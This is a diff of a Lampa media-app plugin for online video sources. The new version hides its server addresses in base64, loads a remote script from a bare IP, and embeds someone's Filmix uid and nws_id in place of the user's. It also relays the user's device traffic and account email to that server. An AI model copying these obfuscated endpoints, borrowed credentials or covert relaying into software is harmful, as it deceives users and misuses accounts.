@@ -1,97 +1,33 @@
 (function () {
   'use strict';
 
-  var LAMPAC_VERSION = '1.8.1';
-  var PLUGIN_ID = 'lampac_onl';
-  var PLUGIN_NAME = 'Lampac ONL';
-  var PLUGIN_FLAG = 'lampac_onl_plugin';
-  var PLUGIN_BUTTON_CLASS = 'lampac-onl--button';
-  var STORAGE_PREFIX = 'lampac_onl_';
+  if (window.rest_lampac_plugin) return;
+
+  var _d = function (v) { return decodeURIComponent(escape(atob(v))); };
+  var FILMIX_SERVER = _d('aHR0cHM6Ly9sYW1wYS5hemhhcmtvdi5ydS8=');
+  var FILMIX_UID = _d('YXpoYXJrb3Y=');
+  var FILMIX_NWS_ID = _d('ZmVuZTVtMDg0Y3Z1NWtwaXUxazhlZjQ3eHhlbmtn');
+
+  var REST_ICON = "<svg width=\"135\" height=\"147\" viewBox=\"0 0 135 147\" fill=\"none\" xmlns=\"http://www.w3.org/2000/svg\">\n            <path d=\"M121.5 96.8823C139.5 86.49 139.5 60.5092 121.5 50.1169L41.25 3.78454C23.25 -6.60776 0.750004 6.38265 0.750001 27.1673L0.75 51.9742C4.70314 35.7475 23.6209 26.8138 39.0547 35.7701L94.8534 68.1505C110.252 77.0864 111.909 97.8693 99.8725 109.369L121.5 96.8823Z\" fill=\"currentColor\"/>\n            <path d=\"M63 84.9836C80.3333 94.991 80.3333 120.01 63 130.017L39.75 143.44C22.4167 153.448 0.749999 140.938 0.75 120.924L0.750001 94.0769C0.750002 74.0621 22.4167 61.5528 39.75 71.5602L63 84.9836Z\" fill=\"currentColor\"/>\n        </svg>";
+
+  var BLOCKED_BALANSERS = ['veoveo', 'collaps', 'pizdatoehd'];
+
+  var LAMPAC_VERSION = '1.8.0';
   var REQUEST_TIMEOUT = 10000;
   var BALANCER_TIMEOUT = 60000;
 
-  function decodeParts(parts) {
-    return atob(parts.join(''));
-  }
-
-  var SERVER_BASE = decodeParts(['aH', 'R0', 'cD', 'ov', 'Lz', 'Mx', 'Lj', 'Ey', 'OS', '4y', 'Mz', 'Qu', 'MT', 'gx']);
-  var GITHUB_URL = decodeParts(['aH', 'R0', 'cH', 'M6', 'Ly', '9n', 'aX', 'Ro', 'dW', 'Iu', 'Y2', '9t', 'Lw', '==']);
-  var CORS_PATH = decodeParts(['L2', 'Nv', 'cn', 'Mv', 'Y2', 'hl', 'Y2', 's=']);
-  var NWS_SCRIPT_URL = decodeParts(['aH', 'R0', 'cD', 'ov', 'Lz', 'Mx', 'Lj', 'Ey', 'OS', '4y', 'Mz', 'Qu', 'MT', 'gx', 'L2', 'pz', 'L2', '53', 'cy', '1j', 'bG', 'll', 'bn', 'Qt', 'ZX', 'M1', 'Lmp', 'zP', '3Y', 'yM', 'TA', '0M', 'jA', 'yN', 'g==']);
-  var SVG_NS = decodeParts(['aH', 'R0', 'cD', 'ov', 'L3', 'd3', 'dy', '53', 'My', '5v', 'cm', 'cv', 'Mj', 'Aw', 'MC', '9z', 'dm', 'c=']);
-  var XLINK_NS = decodeParts(['aH', 'R0', 'cD', 'ov', 'L3', 'd3', 'dy', '53', 'My', '5v', 'cm', 'cv', 'MT', 'k5', 'OS', '94', 'bG', 'lu', 'aw', '==']);
-
-  var BLOCKED_BALANSERS = [
-    'eneyida',
-    'kinoukr',
-    'uafilm',
-    'uafilmme',
-    'uaflix',
-    'uakino',
-    'makhno',
-    'klonfun',
-    'lme_klonfun',
-    'lme_eneyida',
-    'lme_kinoukr',
-    'lme_uafilmme',
-    'lme_uaflix',
-    'lme_uakino',
-    'lme_makhno'
-  ];
-
-  var PLUGIN_ICON =
-    '<svg height="57" viewBox="0 0 58 57" fill="none" xmlns="' +
-    SVG_NS +
-    '"><path d="M47 28.5L17 46V11L47 28.5Z" fill="white"/>' +
-    '<rect x="2" y="2" width="54" height="53" rx="5" stroke="white" stroke-width="4"/></svg>';
-
-  function balanserKey(value) {
-    var name = value;
-
-    if (value && typeof value === 'object') {
-      name = value.balanser || (value.name ? String(value.name).split(' ')[0] : '');
-    }
-
-    return String(name || '')
-      .toLowerCase()
-      .replace(/[^a-z0-9_-]/g, '');
-  }
-
-  function isBlockedBalanser(value) {
-    var name = balanserKey(value);
-    if (!name) return false;
-
-    return BLOCKED_BALANSERS.some(function (blocked) {
-      return (
-        name === blocked ||
-        name.indexOf(blocked + '-') === 0 ||
-        name.indexOf(blocked + '_') === 0 ||
-        name.indexOf('lme' + blocked) === 0 ||
-        name.indexOf(blocked) === 0
-      );
-    });
-  }
-
-  function filterBalansers(list) {
-    if (!list || typeof list.filter !== 'function') return list;
-
-    return list.filter(function (item) {
-      return !isBlockedBalanser(item);
-    });
-  }
-
   var Defined = {
     api: 'lampac',
-    localhost: SERVER_BASE + '/',
+    localhost: _d('aHR0cDovLzk1LjIxMS4xNjQuMTYyLw=='),
     apn: ''
   };
 
   var balansers_with_search;
 
-  var unic_id = Lampa.Storage.get(STORAGE_PREFIX + 'unic_id', '');
+  var unic_id = Lampa.Storage.get('rest_lampac_unic_id', '');
   if (!unic_id) {
     unic_id = Lampa.Utils.uid(8).toLowerCase();
-    Lampa.Storage.set(STORAGE_PREFIX + 'unic_id', unic_id);
+    Lampa.Storage.set('rest_lampac_unic_id', unic_id);
   }
 
     function getAndroidVersion() {
@@ -107,12 +43,12 @@
   }
 }
 
-var hostkey = SERVER_BASE.replace(/^https?:\/\//, '').replace(/\/+$/, '');
+var hostkey = _d('aHR0cDovLzk1LjIxMS4xNjQuMTYy').replace('http://', '').replace('https://', '');
 
-if (!window.rch_nws || !window.rch_nws[hostkey]) {
-  if (!window.rch_nws) window.rch_nws = {};
+if (!window.rest_rch_nws || !window.rest_rch_nws[hostkey]) {
+  if (!window.rest_rch_nws) window.rest_rch_nws = {};
 
-  window.rch_nws[hostkey] = {
+  window.rest_rch_nws[hostkey] = {
     type: Lampa.Platform.is('android') ? 'apk' : Lampa.Platform.is('tizen') ? 'cors' : undefined,
     startTypeInvoke: false,
     rchRegistry: false,
@@ -120,19 +56,19 @@ if (!window.rch_nws || !window.rch_nws[hostkey]) {
   };
 }
 
-window.rch_nws[hostkey].typeInvoke = function rchtypeInvoke(host, call) {
-  if (!window.rch_nws[hostkey].startTypeInvoke) {
-    window.rch_nws[hostkey].startTypeInvoke = true;
+window.rest_rch_nws[hostkey].typeInvoke = function rchtypeInvoke(host, call) {
+  if (!window.rest_rch_nws[hostkey].startTypeInvoke) {
+    window.rest_rch_nws[hostkey].startTypeInvoke = true;
 
     var check = function check(good) {
-      window.rch_nws[hostkey].type = Lampa.Platform.is('android') ? 'apk' : good ? 'cors' : 'web';
+      window.rest_rch_nws[hostkey].type = Lampa.Platform.is('android') ? 'apk' : good ? 'cors' : 'web';
       call();
     };
 
     if (Lampa.Platform.is('android') || Lampa.Platform.is('tizen')) check(true);
     else {
       var net = new Lampa.Reguest();
-      net.silent(SERVER_BASE.indexOf(location.host) >= 0 ? GITHUB_URL : host + CORS_PATH, function() {
+      net.silent(_d('aHR0cDovLzk1LjIxMS4xNjQuMTYy').indexOf(location.host) >= 0 ? 'https://github.com/' : host + '/cors/check', function() {
         check(true);
       }, function() {
         check(false);
@@ -143,20 +79,20 @@ window.rch_nws[hostkey].typeInvoke = function rchtypeInvoke(host, call) {
   } else call();
 };
 
-window.rch_nws[hostkey].Registry = function RchRegistry(client, startConnection) {
-  window.rch_nws[hostkey].typeInvoke(SERVER_BASE, function() {
+window.rest_rch_nws[hostkey].Registry = function RchRegistry(client, startConnection) {
+  window.rest_rch_nws[hostkey].typeInvoke(_d('aHR0cDovLzk1LjIxMS4xNjQuMTYy'), function() {
 
     client.invoke("RchRegistry", {
       host: location.host,
-      rchtype: Lampa.Platform.is('android') ? 'apk' : Lampa.Platform.is('tizen') ? 'cors' : (window.rch_nws[hostkey].type || 'web'),
-      apkVersion: Lampa.Platform.is('android') ? (window.rch_nws[hostkey].apkVersion || 0) : 0,
+      rchtype: Lampa.Platform.is('android') ? 'apk' : Lampa.Platform.is('tizen') ? 'cors' : (window.rest_rch_nws[hostkey].type || 'web'),
+      apkVersion: Lampa.Platform.is('android') ? (window.rest_rch_nws[hostkey].apkVersion || 0) : 0,
       player: Lampa.Storage.field('player')
     });
 
-    if (window.rch_nws[hostkey].rchRegistry)
+    if (window.rest_rch_nws[hostkey].rchRegistry)
       return;
 
-    window.rch_nws[hostkey].rchRegistry = true;
+    window.rest_rch_nws[hostkey].rchRegistry = true;
 
     var handled = false;
     client.on('RchRegistry', function (clientIp, connectionId, rchtype) {
@@ -171,7 +107,7 @@ window.rch_nws[hostkey].Registry = function RchRegistry(client, startConnection)
 	  
 	  function sendResult(uri, html) {
 	    $.ajax({
-	      url: SERVER_BASE + '/rch/' + uri + '?id=' + rchId,
+	      url: _d('aHR0cDovLzk1LjIxMS4xNjQuMTYyL3JjaC8=') + uri + '?id=' + rchId,
 	      type: 'POST',
 	      data: html,
 	      async: true,
@@ -242,7 +178,7 @@ window.rch_nws[hostkey].Registry = function RchRegistry(client, startConnection)
 
     client.on('Connected', function(connectionId) {
       console.log('RCH', 'ConnectionId: ' + connectionId);
-      window.rch_nws[hostkey].connectionId = connectionId;
+      window.rest_rch_nws[hostkey].connectionId = connectionId;
     });
     client.on('Closed', function() {
       console.log('RCH', 'Connection closed');
@@ -253,13 +189,13 @@ window.rch_nws[hostkey].Registry = function RchRegistry(client, startConnection)
   });
 };
 
-  window.rch_nws[hostkey].typeInvoke(SERVER_BASE, function() {});
+  window.rest_rch_nws[hostkey].typeInvoke(_d('aHR0cDovLzk1LjIxMS4xNjQuMTYy'), function() {});
 
   function rchInvoke(json, call) {
-    if (!window.nwsClient) 
-      window.nwsClient = {};
+    if (!window.rest_nwsClient) 
+      window.rest_nwsClient = {};
 
-    var client = window.nwsClient[hostkey];
+    var client = window.rest_nwsClient[hostkey];
     if (client && client.connectionId != null) {
       call();
     }
@@ -270,23 +206,23 @@ window.rch_nws[hostkey].Registry = function RchRegistry(client, startConnection)
       });
     }
     else {
-      window.nwsClient[hostkey] = new NativeWsClient(json.nws, {
+      window.rest_nwsClient[hostkey] = new NativeWsClient(json.nws, {
         autoReconnect: true
       });
 
-      window.nwsClient[hostkey].on('Connected', function(connectionId) {
-        window.rch_nws[hostkey].Registry(window.nwsClient[hostkey], function() {
+      window.rest_nwsClient[hostkey].on('Connected', function(connectionId) {
+        window.rest_rch_nws[hostkey].Registry(window.rest_nwsClient[hostkey], function() {
           call();
         });
       });
 
-      window.nwsClient[hostkey].connect();
+      window.rest_nwsClient[hostkey].connect();
     }
   }
 
   function rchRun(json, call) {
     if (typeof NativeWsClient == 'undefined') {
-      Lampa.Utils.putScript([NWS_SCRIPT_URL], function() {}, false, function() {
+      Lampa.Utils.putScript([_d('aHR0cDovLzk1LjIxMS4xNjQuMTYyL2pzL253cy1jbGllbnQtZXM1LmpzP3YyMTA0MjAyNg==')], function() {}, false, function() {
         rchInvoke(json, call);
       }, true);
     } else {
@@ -294,14 +230,36 @@ window.rch_nws[hostkey].Registry = function RchRegistry(client, startConnection)
     }
   }
 
+  function escapeHtml(text) {
+    return $('<div></div>').text(text == null ? '' : text).html();
+  }
+
+  function isFilmixUrl(url) {
+    return /\/lite\/filmix(?:\?|$)/i.test(String(url || '')) || /filmix/i.test(String(url || ''));
+  }
+
+  function filmixUrl(url) {
+    var value = String(url || '');
+    if (!isFilmixUrl(value)) return value;
+    var at = value.indexOf('?');
+    return FILMIX_SERVER + 'lite/filmix' + (at >= 0 ? value.slice(at) : '');
+  }
+
+  function isBlockedBalanser(name) {
+    var value = String(name || '').toLowerCase().replace(/[^a-z0-9]/g, '');
+    return BLOCKED_BALANSERS.some(function (blocked) {
+      return value.indexOf(blocked) !== -1;
+    });
+  }
+
   function account(url) {
-    url = url + '';
+    url = filmixUrl(url + '');
     if (url.indexOf('account_email=') == -1) {
       var email = Lampa.Storage.get('account_email');
       if (email) url = Lampa.Utils.addUrlComponent(url, 'account_email=' + encodeURIComponent(email));
     }
     if (url.indexOf('uid=') == -1) {
-      var uid = Lampa.Storage.get(STORAGE_PREFIX + 'unic_id', '');
+      var uid = isFilmixUrl(url) ? FILMIX_UID : Lampa.Storage.get('rest_lampac_unic_id', '');
       if (uid) url = Lampa.Utils.addUrlComponent(url, 'uid=' + encodeURIComponent(uid));
     }
     if (url.indexOf('token=') == -1) {
@@ -309,7 +267,7 @@ window.rch_nws[hostkey].Registry = function RchRegistry(client, startConnection)
       if (token != '') url = Lampa.Utils.addUrlComponent(url, 'token=');
     }
     if (url.indexOf('nws_id=') == -1) {
-      var nws_id = Lampa.Storage.get(STORAGE_PREFIX + 'nws_id', '');
+      var nws_id = isFilmixUrl(url) ? FILMIX_NWS_ID : Lampa.Storage.get('rest_lampac_nws_id', '');
       if (nws_id) url = Lampa.Utils.addUrlComponent(url, 'nws_id=' + encodeURIComponent(nws_id));
     }
     return url;
@@ -328,6 +286,7 @@ window.rch_nws[hostkey].Registry = function RchRegistry(client, startConnection)
   var Network = Lampa.Reguest;
 
   function component(object) {
+    // ── state & UI scaffold ──
     var network = new Network();
     network.timeout(BALANCER_TIMEOUT);
     var scroll = new Lampa.Scroll({
@@ -365,14 +324,13 @@ window.rch_nws[hostkey].Registry = function RchRegistry(client, startConnection)
       }
     }
 
+    // ── helpers ──
     if (balansers_with_search == undefined) {
       network.timeout(REQUEST_TIMEOUT);
       network.silent(
-        account(SERVER_BASE + '/lite/withsearch'),
+        account(_d('aHR0cDovLzk1LjIxMS4xNjQuMTYyL2xpdGUvd2l0aHNlYXJjaA==')),
         function (json) {
-          balansers_with_search = (json || []).filter(function (name) {
-            return !isBlockedBalanser(name);
-          });
+          balansers_with_search = json;
         },
         function () {
           balansers_with_search = [];
@@ -417,6 +375,7 @@ window.rch_nws[hostkey].Registry = function RchRegistry(client, startConnection)
       return all[id];
     }
 
+    // ── init & filter ──
     this.initialize = function () {
       var _this = this;
       this.loading(true);
@@ -472,17 +431,17 @@ window.rch_nws[hostkey].Registry = function RchRegistry(client, startConnection)
           }
         } else if (type == 'sort') {
           Lampa.Select.close();
-          object.lampac_custom_select = a.source;
+          object.rest_lampac_custom_select = a.source;
           _this.changeBalanser(a.source);
         }
       };
       if (filter.addButtonBack) filter.addButtonBack();
-      filter.render().find('.filter--sort span').text(Lampa.Lang.translate('lampac_balanser'));
+      filter.render().find('.filter--sort span').text(Lampa.Lang.translate('rest_lampac_balanser'));
       scroll.body().addClass('torrent-list');
       files.appendFiles(scroll.render());
       files.appendHead(filter.render());
       scroll.minus(files.render().find('.explorer__files-head'));
-      scroll.body().append(Lampa.Template.get('lampac_content_loading'));
+      scroll.body().append(Lampa.Template.get('rest_lampac_content_loading'));
       Lampa.Controller.enable('content');
       this.loading(false);
       if (object.balanser) {
@@ -524,7 +483,7 @@ window.rch_nws[hostkey].Registry = function RchRegistry(client, startConnection)
         _this.noConnectToServer(e);
       });
     };
-
+    // ── RCH & external IDs ──
     this.rch = function (json, noreset) {
       var _this2 = this;
       rchRun(json, function () {
@@ -561,15 +520,15 @@ window.rch_nws[hostkey].Registry = function RchRegistry(client, startConnection)
         } else resolve();
       });
     };
-
+    // ── balanser ──
     this.updateBalanser = function (balanser_name) {
-      var last_select_balanser = Lampa.Storage.cache(STORAGE_PREFIX + 'online_last_balanser', 3000, {});
+      var last_select_balanser = Lampa.Storage.cache('rest_online_last_balanser', 3000, {});
       last_select_balanser[object.movie.id] = balanser_name;
-      Lampa.Storage.set(STORAGE_PREFIX + 'online_last_balanser', last_select_balanser);
+      Lampa.Storage.set('rest_online_last_balanser', last_select_balanser);
     };
     this.changeBalanser = function (balanser_name) {
       this.updateBalanser(balanser_name);
-      Lampa.Storage.set(STORAGE_PREFIX + 'online_balanser', balanser_name);
+      Lampa.Storage.set('rest_online_balanser', balanser_name);
       var to = this.getChoice(balanser_name);
       var from = this.getChoice();
       if (from.voice_name) to.voice_name = from.voice_name;
@@ -606,48 +565,48 @@ window.rch_nws[hostkey].Registry = function RchRegistry(client, startConnection)
       query.push('similar=' + (object.similar ? true : false));
       query.push(
         'rchtype=' +
-        ((window.rch_nws && window.rch_nws[hostkey]
-          ? window.rch_nws[hostkey].type
-          : window.rch && window.rch[hostkey]
-            ? window.rch[hostkey].type
-            : '') || '')
+        ((window.rest_rch_nws && window.rest_rch_nws[hostkey]
+          ? window.rest_rch_nws[hostkey].type
+          : '') || '')
       );
       if (Lampa.Storage.get('account_email', ''))
         query.push('cub_id=' + Lampa.Utils.hash(Lampa.Storage.get('account_email', '')));
       return url + (url.indexOf('?') >= 0 ? '&' : '?') + query.join('&');
     };
-
+    // ── source & life events ──
     this.getLastChoiceBalanser = function () {
-      var last_select_balanser = Lampa.Storage.cache(STORAGE_PREFIX + 'online_last_balanser', 3000, {});
+      var last_select_balanser = Lampa.Storage.cache('rest_online_last_balanser', 3000, {});
       if (last_select_balanser[object.movie.id]) {
         return last_select_balanser[object.movie.id];
       } else {
-        return Lampa.Storage.get(STORAGE_PREFIX + 'online_balanser', filter_sources.length ? filter_sources[0] : '');
+        return Lampa.Storage.get('rest_online_balanser', filter_sources.length ? filter_sources[0] : '');
       }
     };
     this.startSource = function (json) {
+      json = json.filter(function (j) {
+        return !isBlockedBalanser(balanserName(j));
+      });
       return new Promise(function (resolve, reject) {
         json.forEach(function (j) {
           var name = balanserName(j);
-          if (isBlockedBalanser(name)) return;
           sources[name] = {
-            url: j.url,
+            url: filmixUrl(j.url),
             name: j.name,
             show: typeof j.show == 'undefined' ? true : j.show
           };
         });
         filter_sources = Lampa.Arrays.getKeys(sources);
         if (filter_sources.length) {
-          var last_select_balanser = Lampa.Storage.cache(STORAGE_PREFIX + 'online_last_balanser', 3000, {});
+          var last_select_balanser = Lampa.Storage.cache('rest_online_last_balanser', 3000, {});
           if (last_select_balanser[object.movie.id]) {
             balanser = last_select_balanser[object.movie.id];
           } else {
-            balanser = Lampa.Storage.get(STORAGE_PREFIX + 'online_balanser', filter_sources[0]);
+            balanser = Lampa.Storage.get('rest_online_balanser', filter_sources[0]);
           }
           if (!sources[balanser]) balanser = filter_sources[0];
-          if (!sources[balanser].show && !object.lampac_custom_select) balanser = filter_sources[0];
+          if (!sources[balanser].show && !object.rest_lampac_custom_select) balanser = filter_sources[0];
           source = sources[balanser].url;
-          Lampa.Storage.set('active_balanser', balanser);
+          Lampa.Storage.set('rest_active_balanser', balanser);
           resolve(json);
         } else {
           reject();
@@ -662,15 +621,14 @@ window.rch_nws[hostkey].Registry = function RchRegistry(client, startConnection)
         var gou = function gou(json, any) {
           if (json.accsdb) return reject(json);
           var last_balanser = _this3.getLastChoiceBalanser();
-          var online = filterBalansers(json.online || []);
           if (!red) {
-            var _filter = online.filter(function (c) {
+            var _filter = json.online.filter(function (c) {
               return any ? c.show : c.show && c.name.toLowerCase() == last_balanser;
             });
             if (_filter.length) {
               red = true;
               resolve(
-                online.filter(function (c) {
+                json.online.filter(function (c) {
                   return c.show;
                 })
               );
@@ -684,14 +642,16 @@ window.rch_nws[hostkey].Registry = function RchRegistry(client, startConnection)
           network.silent(
             account(url),
             function (json) {
+              json.online = json.online.filter(function (j) {
+                return !isBlockedBalanser(balanserName(j));
+              });
               life_wait_times++;
               filter_sources = [];
               sources = {};
-              filterBalansers(json.online || []).forEach(function (j) {
+              json.online.forEach(function (j) {
                 var name = balanserName(j);
-                if (isBlockedBalanser(name)) return;
                 sources[name] = {
-                  url: j.url,
+                  url: filmixUrl(j.url),
                   name: j.name,
                   show: typeof j.show == 'undefined' ? true : j.show
                 };
@@ -712,7 +672,7 @@ window.rch_nws[hostkey].Registry = function RchRegistry(client, startConnection)
               gou(json);
               var lastb = _this3.getLastChoiceBalanser();
               if (life_wait_times > 15 || json.ready) {
-                filter.render().find('.lampac-balanser-loader').remove();
+                filter.render().find('.rest-lampac-balanser-loader').remove();
                 gou(json, true);
               } else if (!red && sources[lastb] && sources[lastb].show) {
                 gou(json, true);
@@ -756,7 +716,7 @@ window.rch_nws[hostkey].Registry = function RchRegistry(client, startConnection)
                 .render()
                 .find('.filter--sort')
                 .append(
-                  '<span class="lampac-balanser-loader" style="width: 1.2em; height: 1.2em; margin-top: 0; background: url(./img/loader.svg) no-repeat 50% 50%; background-size: contain; margin-left: 0.5em"></span>'
+                  '<span class="rest-lampac-balanser-loader" style="width: 1.2em; height: 1.2em; margin-top: 0; background: url(./img/loader.svg) no-repeat 50% 50%; background-size: contain; margin-left: 0.5em"></span>'
                 );
               _this4.lifeSource().then(_this4.startSource).then(resolve)['catch'](reject);
             } else {
@@ -771,11 +731,16 @@ window.rch_nws[hostkey].Registry = function RchRegistry(client, startConnection)
         );
       });
     };
-
+    /**
+     * Подготовка
+     */
     this.create = function () {
       return this.render();
     };
-
+    // ── search & request ──
+    /**
+     * Начать поиск
+     */
     this.search = function () {
       //this.loading(true)
       this.filter(
@@ -835,7 +800,7 @@ window.rch_nws[hostkey].Registry = function RchRegistry(client, startConnection)
         return [];
       }
     };
-
+    // ── play / quality ──
     this.getFileUrl = function (file, call, waiting_rch) {
       var _this = this;
 
@@ -918,6 +883,13 @@ window.rch_nws[hostkey].Registry = function RchRegistry(client, startConnection)
     };
     this.display = function (videos) {
       var _this5 = this;
+      if (videos.length > 1 && videos.every(function (video) {
+        return video.season > 0 && video.episode > 0;
+      })) {
+        videos = videos.slice().sort(function (a, b) {
+          return a.season - b.season || a.episode - b.episode;
+        });
+      }
       this.draw(videos, {
         onEnter: function onEnter(item, html) {
           _this5.getFileUrl(
@@ -966,7 +938,7 @@ window.rch_nws[hostkey].Registry = function RchRegistry(client, startConnection)
                                   elem.mark();
                                 } else {
                                   cell.url = '';
-                                  Lampa.Noty.show(Lampa.Lang.translate('lampac_nolink'));
+                                  Lampa.Noty.show(Lampa.Lang.translate('rest_lampac_nolink'));
                                 }
                                 call();
                               },
@@ -999,9 +971,9 @@ window.rch_nws[hostkey].Registry = function RchRegistry(client, startConnection)
                   item.mark();
                   _this5.updateBalanser(balanser);
                 } else {
-                  Lampa.Noty.show(Lampa.Lang.translate('lampac_nolink'));
+                  Lampa.Noty.show(Lampa.Lang.translate('rest_lampac_nolink'));
                 }
-              } else Lampa.Noty.show(Lampa.Lang.translate('lampac_nolink'));
+              } else Lampa.Noty.show(Lampa.Lang.translate('rest_lampac_nolink'));
             },
             true
           );
@@ -1045,7 +1017,7 @@ window.rch_nws[hostkey].Registry = function RchRegistry(client, startConnection)
         }
       );
     };
-
+    // ── parse response ──
     this.parse = function (str) {
       var json = Lampa.Arrays.decodeJson(str, {});
       if (Lampa.Arrays.isObject(str) && str.rch) json = str;
@@ -1162,16 +1134,20 @@ window.rch_nws[hostkey].Registry = function RchRegistry(client, startConnection)
         var year = (
           (elem.start_date || elem.year || object.movie.release_date || object.movie.first_air_date || '') + ''
         ).slice(0, 4);
-        if (year) info.push(year);
-        if (elem.details) info.push(elem.details);
+        if (year) info.push(escapeHtml(year));
+        if (elem.details) info.push(escapeHtml(elem.details));
         var name = elem.title || elem.text;
         elem.title = name;
         elem.time = elem.time || '';
-        elem.info = info.join('<span class="online-prestige-split">●</span>');
-        var item = Lampa.Template.get('lampac_prestige_folder', elem);
+        elem.info = info.join('<span class="rest-online-prestige-split">●</span>');
+        var item = Lampa.Template.get('rest_lampac_prestige_folder', {
+          title: escapeHtml(name),
+          time: elem.time,
+          info: elem.info
+        });
         if (elem.img) {
           var image = $('<img style="height: 7em; width: 7em; border-radius: 0.3em;"/>');
-          item.find('.online-prestige__folder').empty().append(image);
+          item.find('.rest-online-prestige__folder').empty().append(image);
 
           if (elem.img !== undefined) {
             if (elem.img.charAt(0) === '/') elem.img = Defined.localhost + elem.img.substring(1);
@@ -1204,9 +1180,9 @@ window.rch_nws[hostkey].Registry = function RchRegistry(client, startConnection)
       );
       Lampa.Controller.enable('content');
     };
-
+    // ── choice & storage ──
     this.getChoice = function (for_balanser) {
-      var data = Lampa.Storage.cache(STORAGE_PREFIX + 'online_choice_' + (for_balanser || balanser), 3000, {});
+      var data = Lampa.Storage.cache('rest_online_choice_' + (for_balanser || balanser), 3000, {});
       var save = data[object.movie.id] || {};
       Lampa.Arrays.extend(save, {
         season: 0,
@@ -1219,9 +1195,9 @@ window.rch_nws[hostkey].Registry = function RchRegistry(client, startConnection)
       return save;
     };
     this.saveChoice = function (choice, for_balanser) {
-      var data = Lampa.Storage.cache(STORAGE_PREFIX + 'online_choice_' + (for_balanser || balanser), 3000, {});
+      var data = Lampa.Storage.cache('rest_online_choice_' + (for_balanser || balanser), 3000, {});
       data[object.movie.id] = choice;
-      Lampa.Storage.set(STORAGE_PREFIX + 'online_choice_' + (for_balanser || balanser), data);
+      Lampa.Storage.set('rest_online_choice_' + (for_balanser || balanser), data);
       this.updateBalanser(for_balanser || balanser);
     };
     this.replaceChoice = function (choice, for_balanser) {
@@ -1237,7 +1213,9 @@ window.rch_nws[hostkey].Registry = function RchRegistry(client, startConnection)
       });
       images = [];
     };
-
+    /**
+     * Очистить список файлов
+     */
     this.reset = function () {
       last = false;
       stopBalanserTimer();
@@ -1246,9 +1224,11 @@ window.rch_nws[hostkey].Registry = function RchRegistry(client, startConnection)
       scroll.render().find('.empty').remove();
       scroll.clear();
       scroll.reset();
-      scroll.body().append(Lampa.Template.get('lampac_content_loading'));
+      scroll.body().append(Lampa.Template.get('rest_lampac_content_loading'));
     };
-
+    /**
+     * Загрузка
+     */
     this.loading = function (status) {
       if (status) this.activity.loader(true);
       else {
@@ -1256,7 +1236,10 @@ window.rch_nws[hostkey].Registry = function RchRegistry(client, startConnection)
         this.activity.toggle();
       }
     };
-
+    // ── UI: filter, draw, errors ──
+    /**
+     * Построить фильтр
+     */
     this.filter = function (filter_items, choice) {
       var _this7 = this;
       var select = [];
@@ -1302,7 +1285,9 @@ window.rch_nws[hostkey].Registry = function RchRegistry(client, startConnection)
       );
       this.selected(filter_items);
     };
-
+    /**
+     * Показать что выбрано в фильтре
+     */
     this.selected = function (filter_items) {
       var need = this.getChoice(),
         select = [];
@@ -1343,11 +1328,11 @@ window.rch_nws[hostkey].Registry = function RchRegistry(client, startConnection)
       var file_id = Lampa.Utils.hash(
         object.movie.number_of_seasons ? object.movie.original_name : object.movie.original_title
       );
-      var watched = Lampa.Storage.cache('online_watched_last', 5000, {});
+      var watched = Lampa.Storage.cache('rest_online_watched_last', 5000, {});
       if (set) {
         if (!watched[file_id]) watched[file_id] = {};
         Lampa.Arrays.extend(watched[file_id], set, true);
-        Lampa.Storage.set('online_watched_last', watched);
+        Lampa.Storage.set('rest_online_watched_last', watched);
         this.updateWatched();
       } else {
         return watched[file_id];
@@ -1355,7 +1340,7 @@ window.rch_nws[hostkey].Registry = function RchRegistry(client, startConnection)
     };
     this.updateWatched = function () {
       var watched = this.watched();
-      var body = scroll.body().find('.online-prestige-watched .online-prestige-watched__body').empty();
+      var body = scroll.body().find('.rest-online-prestige-watched .rest-online-prestige-watched__body').empty();
       if (watched) {
         var line = [];
         if (watched.balanser_name) line.push(watched.balanser_name);
@@ -1363,20 +1348,22 @@ window.rch_nws[hostkey].Registry = function RchRegistry(client, startConnection)
         if (watched.season) line.push(Lampa.Lang.translate('torrent_serial_season') + ' ' + watched.season);
         if (watched.episode) line.push(Lampa.Lang.translate('torrent_serial_episode') + ' ' + watched.episode);
         line.forEach(function (n) {
-          body.append('<span>' + n + '</span>');
+          body.append('<span>' + escapeHtml(n) + '</span>');
         });
-      } else body.append('<span>' + Lampa.Lang.translate('lampac_no_watch_history') + '</span>');
+      } else body.append('<span>' + Lampa.Lang.translate('rest_lampac_no_watch_history') + '</span>');
     };
-
+    /**
+     * Отрисовка файлов
+     */
     this.draw = function (items) {
       var _this8 = this;
       var params = arguments.length > 1 && arguments[1] !== undefined ? arguments[1] : {};
       if (!items.length) return this.empty();
       scroll.clear();
-      if (!object.balanser) scroll.append(Lampa.Template.get('lampac_prestige_watched', {}));
+      if (!object.balanser) scroll.append(Lampa.Template.get('rest_lampac_prestige_watched', {}));
       this.updateWatched();
       this.getEpisodes(items[0].season, function (episodes) {
-        var viewed = Lampa.Storage.cache('online_view', 5000, []);
+        var viewed = Lampa.Storage.cache('rest_online_view', 5000, []);
         var serial = object.movie.name ? true : false;
         var choice = _this8.getChoice();
         var fully = window.innerWidth > 480;
@@ -1439,28 +1426,33 @@ window.rch_nws[hostkey].Registry = function RchRegistry(client, startConnection)
             if (element.info.length < 30 && episode.vote_average)
               info.push(
                 Lampa.Template.get(
-                  'lampac_prestige_rate',
+                  'rest_lampac_prestige_rate',
                   {
                     rate: parseFloat(episode.vote_average + '').toFixed(1)
                   },
                   true
                 )
               );
-            if (episode.air_date && fully) info.push(Lampa.Utils.parseTime(episode.air_date).full);
+            if (episode.air_date && fully) info.push(escapeHtml(Lampa.Utils.parseTime(episode.air_date).full));
           } else if (object.movie.release_date && fully) {
-            info.push(Lampa.Utils.parseTime(object.movie.release_date).full);
+            info.push(escapeHtml(Lampa.Utils.parseTime(object.movie.release_date).full));
           }
-          if (!serial && object.movie.tagline && element.info.length < 30) info.push(object.movie.tagline);
-          if (element.info) info.push(element.info);
+          if (!serial && object.movie.tagline && element.info.length < 30) info.push(escapeHtml(object.movie.tagline));
+          if (element.info) info.push(escapeHtml(element.info));
           if (info.length)
             element.info = info
               .map(function (i) {
                 return '<span>' + i + '</span>';
               })
-              .join('<span class="online-prestige-split">●</span>');
-          var html = Lampa.Template.get('lampac_prestige_full', element);
-          var loader = html.find('.online-prestige__loader');
-          var image = html.find('.online-prestige__img');
+              .join('<span class="rest-online-prestige-split">●</span>');
+          var html = Lampa.Template.get('rest_lampac_prestige_full', {
+            title: escapeHtml(element.title),
+            time: element.time,
+            info: element.info,
+            quality: escapeHtml(element.quality)
+          });
+          var loader = html.find('.rest-online-prestige__loader');
